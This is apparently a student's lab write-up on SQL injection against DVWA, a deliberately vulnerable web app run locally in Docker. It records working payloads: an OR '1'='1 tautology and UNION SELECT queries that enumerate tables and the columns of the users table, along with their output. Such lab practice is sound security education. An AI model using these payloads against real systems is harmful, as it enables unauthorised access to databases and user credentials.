# SQL Injection Lab using DVWA

## Objective
Practice and understand SQL Injection vulnerabilities using the Damn Vulnerable Web Application (DVWA).

## Setup

- Ran DVWA directly using Docker Hub image:
  
  ```bash
  docker run --rm -it -p 8081:80 vulnerables/web-dvwa
  ```

- Accessed DVWA at:

  ```
  http://localhost:8081
  ```
 - Logged in with default credentials:
    - **Username**: `admin`
    - **Password**: `password`

- Initialized the database by clicking **Create / Reset Database**
- Set **Security Level** to **Low** (under `DVWA Security` menu)

---
## Testing SQL Injection

### Test 1: Basic ID Query

- Entered `1` into the **User ID** field and clicked **Submit**
- Result:

  ```
  ID: 1
  First name: admin
  Surname: admin
  ```

The application is vulnerable — it returns database records directly.

---
### Test 2: Bypass Authentication Logic

- Entered the following input:

  ```sql
  test1' OR '1'='1
  ```

- Output showed **multiple user records**:

  ```
  ID: test1' or '1'='1
  First name: admin
  Surname: admin

  ID: test1' or '1'='1
  First name: Gordon
  Surname: Brown

  ```

SQL logic was bypassed — `OR '1'='1'` returned **all rows**.

# Discovering Database Tables

### Payload to enumerate table names:

```sql
test2' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables #
```

- DVWA returned names of internal database tables:

  ```
  Surname: guestbook
  Surname: users
  Surname: ALL_PLUGINS
  ```

Successfully extracted table names from `information_schema.tables`.

---
## Enumerating Columns from `users` Table

Used the following payload to list column names:

```sql
sparklekitten' AND 1=0 UNION SELECT NULL, concat(table_name,0x0a,column_name) 
FROM information_schema.columns WHERE table_name = 'users' #
```

Output revealed:

```
ID: sparklekitten' AND 1=0 UNION SELECT NULL, concat(table_name,0x0a,column_name) FROM information_schema.columns WHERE table_name = 'users' #
First name: 
Surname: users
user_id

First name: 
Surname: users
first_name
First name: 
Surname: users
last_name

First name: 
Surname: users
user

First name: 
Surname: users
password

First name: 
Surname: users
avatar

First name: 
Surname: users
last_login

First name: 
Surname: users
failed_login
```

Confirmed that `password` and other useful fields exist in the `users` table.

---
